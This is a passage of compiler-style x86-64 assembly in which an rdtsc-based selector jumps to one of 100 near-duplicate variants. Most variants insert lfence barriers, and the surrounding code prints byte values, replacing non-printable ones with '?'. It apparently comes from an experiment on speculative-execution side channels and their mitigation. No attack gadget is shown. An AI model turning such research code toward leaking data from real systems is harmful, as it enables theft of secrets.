	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 34
.Lmain_win1_var34:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 35
.Lmain_win1_var35:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 36
.Lmain_win1_var36:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 37
.Lmain_win1_var37:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 38
.Lmain_win1_var38:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 39
.Lmain_win1_var39:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 40
.Lmain_win1_var40:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 41
.Lmain_win1_var41:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 42
.Lmain_win1_var42:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 43
.Lmain_win1_var43:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 44
.Lmain_win1_var44:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 45
.Lmain_win1_var45:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 46
.Lmain_win1_var46:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 47
.Lmain_win1_var47:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 48
.Lmain_win1_var48:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 49
.Lmain_win1_var49:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 50
.Lmain_win1_var50:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 51
.Lmain_win1_var51:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 52
.Lmain_win1_var52:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 53
.Lmain_win1_var53:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 54
.Lmain_win1_var54:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 55
.Lmain_win1_var55:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 56
.Lmain_win1_var56:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 57
.Lmain_win1_var57:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 58
.Lmain_win1_var58:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 59
.Lmain_win1_var59:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 60
.Lmain_win1_var60:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 61
.Lmain_win1_var61:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 62
.Lmain_win1_var62:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 63
.Lmain_win1_var63:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 64
.Lmain_win1_var64:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 65
.Lmain_win1_var65:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 66
.Lmain_win1_var66:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 67
.Lmain_win1_var67:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 68
.Lmain_win1_var68:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 69
.Lmain_win1_var69:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 70
.Lmain_win1_var70:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 71
.Lmain_win1_var71:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 72
.Lmain_win1_var72:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 73
.Lmain_win1_var73:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 74
.Lmain_win1_var74:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 75
.Lmain_win1_var75:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 76
.Lmain_win1_var76:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 77
.Lmain_win1_var77:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 78
.Lmain_win1_var78:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 79
.Lmain_win1_var79:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 80
.Lmain_win1_var80:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 81
.Lmain_win1_var81:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 82
.Lmain_win1_var82:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 83
.Lmain_win1_var83:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 84
.Lmain_win1_var84:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 85
.Lmain_win1_var85:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 86
.Lmain_win1_var86:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 87
.Lmain_win1_var87:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 88
.Lmain_win1_var88:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 89
.Lmain_win1_var89:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 90
.Lmain_win1_var90:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 91
.Lmain_win1_var91:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 92
.Lmain_win1_var92:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 93
.Lmain_win1_var93:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 94
.Lmain_win1_var94:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 95
.Lmain_win1_var95:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 96
.Lmain_win1_var96:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 97
.Lmain_win1_var97:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 98
.Lmain_win1_var98:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 99
.Lmain_win1_var99:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
.Lmain_win1_continue:
	addq	$32, %rsp
	movzbl	%al, %eax
	jmp	.L41
.L40:
	movl	$63, %eax
.L41:
	movzbl	-9(%rbp), %ecx
	movzbl	%cl, %esi
	movl	%edx, %ecx
	movl	%eax, %edx
	leaq	.LC16(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
.L39:
	movl	$10, %edi
	call	putchar@PLT
.L34:
	movl	-40(%rbp), %eax
	subl	$1, %eax
	movl	%eax, -40(%rbp)
	movl	-40(%rbp), %eax
	subq	$32, %rsp
## RANDOM SELECTOR BLOCK
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$100, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.Lmain_win0_var0
	cmpl	$1, %eax
	je	.Lmain_win0_var1
	cmpl	$2, %eax
	je	.Lmain_win0_var2
	cmpl	$3, %eax
	je	.Lmain_win0_var3
	cmpl	$4, %eax
	je	.Lmain_win0_var4
	cmpl	$5, %eax
	je	.Lmain_win0_var5
	cmpl	$6, %eax
	je	.Lmain_win0_var6
	cmpl	$7, %eax
	je	.Lmain_win0_var7
	cmpl	$8, %eax
	je	.Lmain_win0_var8
	cmpl	$9, %eax
	je	.Lmain_win0_var9
	cmpl	$10, %eax
	je	.Lmain_win0_var10
	cmpl	$11, %eax
	je	.Lmain_win0_var11
	cmpl	$12, %eax
	je	.Lmain_win0_var12
	cmpl	$13, %eax
	je	.Lmain_win0_var13
	cmpl	$14, %eax
	je	.Lmain_win0_var14
	cmpl	$15, %eax
	je	.Lmain_win0_var15
	cmpl	$16, %eax
	je	.Lmain_win0_var16
	cmpl	$17, %eax
	je	.Lmain_win0_var17
	cmpl	$18, %eax
	je	.Lmain_win0_var18
	cmpl	$19, %eax
	je	.Lmain_win0_var19
	cmpl	$20, %eax
	je	.Lmain_win0_var20
	cmpl	$21, %eax
	je	.Lmain_win0_var21
	cmpl	$22, %eax
	je	.Lmain_win0_var22
	cmpl	$23, %eax
	je	.Lmain_win0_var23
	cmpl	$24, %eax
	je	.Lmain_win0_var24
	cmpl	$25, %eax
	je	.Lmain_win0_var25
	cmpl	$26, %eax
	je	.Lmain_win0_var26
	cmpl	$27, %eax
	je	.Lmain_win0_var27
	cmpl	$28, %eax
	je	.Lmain_win0_var28
	cmpl	$29, %eax
	je	.Lmain_win0_var29
	cmpl	$30, %eax
	je	.Lmain_win0_var30
	cmpl	$31, %eax
	je	.Lmain_win0_var31
	cmpl	$32, %eax
	je	.Lmain_win0_var32
	cmpl	$33, %eax
	je	.Lmain_win0_var33
	cmpl	$34, %eax
	je	.Lmain_win0_var34
	cmpl	$35, %eax
	je	.Lmain_win0_var35
	cmpl	$36, %eax
	je	.Lmain_win0_var36
	cmpl	$37, %eax
	je	.Lmain_win0_var37
	cmpl	$38, %eax
	je	.Lmain_win0_var38
	cmpl	$39, %eax
	je	.Lmain_win0_var39
	cmpl	$40, %eax
	je	.Lmain_win0_var40
	cmpl	$41, %eax
	je	.Lmain_win0_var41
	cmpl	$42, %eax
	je	.Lmain_win0_var42
	cmpl	$43, %eax
	je	.Lmain_win0_var43
	cmpl	$44, %eax
	je	.Lmain_win0_var44
	cmpl	$45, %eax
	je	.Lmain_win0_var45
	cmpl	$46, %eax
	je	.Lmain_win0_var46
	cmpl	$47, %eax
	je	.Lmain_win0_var47
	cmpl	$48, %eax
	je	.Lmain_win0_var48
	cmpl	$49, %eax
	je	.Lmain_win0_var49
	cmpl	$50, %eax
	je	.Lmain_win0_var50
	cmpl	$51, %eax
	je	.Lmain_win0_var51
	cmpl	$52, %eax
	je	.Lmain_win0_var52
	cmpl	$53, %eax
	je	.Lmain_win0_var53
	cmpl	$54, %eax
	je	.Lmain_win0_var54
	cmpl	$55, %eax
	je	.Lmain_win0_var55
	cmpl	$56, %eax
	je	.Lmain_win0_var56
	cmpl	$57, %eax
	je	.Lmain_win0_var57
	cmpl	$58, %eax
	je	.Lmain_win0_var58
	cmpl	$59, %eax
	je	.Lmain_win0_var59
	cmpl	$60, %eax
	je	.Lmain_win0_var60
	cmpl	$61, %eax
	je	.Lmain_win0_var61
	cmpl	$62, %eax
	je	.Lmain_win0_var62
	cmpl	$63, %eax
	je	.Lmain_win0_var63
	cmpl	$64, %eax
	je	.Lmain_win0_var64
	cmpl	$65, %eax
	je	.Lmain_win0_var65
	cmpl	$66, %eax
	je	.Lmain_win0_var66
	cmpl	$67, %eax
	je	.Lmain_win0_var67
	cmpl	$68, %eax
	je	.Lmain_win0_var68
	cmpl	$69, %eax
	je	.Lmain_win0_var69
	cmpl	$70, %eax
	je	.Lmain_win0_var70
	cmpl	$71, %eax
	je	.Lmain_win0_var71
	cmpl	$72, %eax
	je	.Lmain_win0_var72
	cmpl	$73, %eax
	je	.Lmain_win0_var73
	cmpl	$74, %eax
	je	.Lmain_win0_var74
	cmpl	$75, %eax
	je	.Lmain_win0_var75
	cmpl	$76, %eax
	je	.Lmain_win0_var76
	cmpl	$77, %eax
	je	.Lmain_win0_var77
	cmpl	$78, %eax
	je	.Lmain_win0_var78
	cmpl	$79, %eax
	je	.Lmain_win0_var79
	cmpl	$80, %eax
	je	.Lmain_win0_var80
	cmpl	$81, %eax
	je	.Lmain_win0_var81
	cmpl	$82, %eax
	je	.Lmain_win0_var82
	cmpl	$83, %eax
	je	.Lmain_win0_var83
	cmpl	$84, %eax
	je	.Lmain_win0_var84
	cmpl	$85, %eax
	je	.Lmain_win0_var85
	cmpl	$86, %eax
	je	.Lmain_win0_var86
	cmpl	$87, %eax
	je	.Lmain_win0_var87
	cmpl	$88, %eax
	je	.Lmain_win0_var88
	cmpl	$89, %eax
	je	.Lmain_win0_var89
	cmpl	$90, %eax
	je	.Lmain_win0_var90
	cmpl	$91, %eax
	je	.Lmain_win0_var91
	cmpl	$92, %eax
	je	.Lmain_win0_var92
	cmpl	$93, %eax
	je	.Lmain_win0_var93
	cmpl	$94, %eax
	je	.Lmain_win0_var94
	cmpl	$95, %eax
	je	.Lmain_win0_var95
	cmpl	$96, %eax
	je	.Lmain_win0_var96
	cmpl	$97, %eax
	je	.Lmain_win0_var97
	cmpl	$98, %eax
	je	.Lmain_win0_var98
	cmpl	$99, %eax
	je	.Lmain_win0_var99
	jmp	.Lmain_win0_var0
## Variant 0
.Lmain_win0_var0:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	movl	$0, %eax
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 1
.Lmain_win0_var1:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 2
.Lmain_win0_var2:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 3
.Lmain_win0_var3:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 4
.Lmain_win0_var4:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 5
.Lmain_win0_var5:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 6
.Lmain_win0_var6:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 7
.Lmain_win0_var7:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 8
.Lmain_win0_var8:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 9
.Lmain_win0_var9:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 10
.Lmain_win0_var10:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 11
.Lmain_win0_var11:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 12
.Lmain_win0_var12:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 13
.Lmain_win0_var13:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 14
.Lmain_win0_var14:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 15
.Lmain_win0_var15:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 16
.Lmain_win0_var16:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 17
.Lmain_win0_var17:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 18
.Lmain_win0_var18:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 19
.Lmain_win0_var19:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 20
.Lmain_win0_var20:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 21
.Lmain_win0_var21:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 22
.Lmain_win0_var22:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 23
.Lmain_win0_var23:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 24
.Lmain_win0_var24:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 25
.Lmain_win0_var25:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 26
.Lmain_win0_var26:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 27
.Lmain_win0_var27:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 28
.Lmain_win0_var28:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 29
.Lmain_win0_var29:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 30
.Lmain_win0_var30:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 31
.Lmain_win0_var31:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 32
.Lmain_win0_var32:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 33
.Lmain_win0_var33:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 34
.Lmain_win0_var34:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 35
.Lmain_win0_var35:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 36
.Lmain_win0_var36:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 37
.Lmain_win0_var37:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 38
.Lmain_win0_var38:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 39
.Lmain_win0_var39:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 40
.Lmain_win0_var40:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 41
.Lmain_win0_var41:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 42
.Lmain_win0_var42:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 43
.Lmain_win0_var43:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 44
.Lmain_win0_var44:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 45
.Lmain_win0_var45:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 46
.Lmain_win0_var46:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 47
.Lmain_win0_var47:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 48
.Lmain_win0_var48:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 49
.Lmain_win0_var49:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 50
.Lmain_win0_var50:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 51
.Lmain_win0_var51:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 52
.Lmain_win0_var52:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 53
.Lmain_win0_var53:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 54
.Lmain_win0_var54:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 55
.Lmain_win0_var55:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 56
.Lmain_win0_var56:
	popq	%rax
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 57
.Lmain_win0_var57:
	popq	%rax
	testl	%eax, %eax
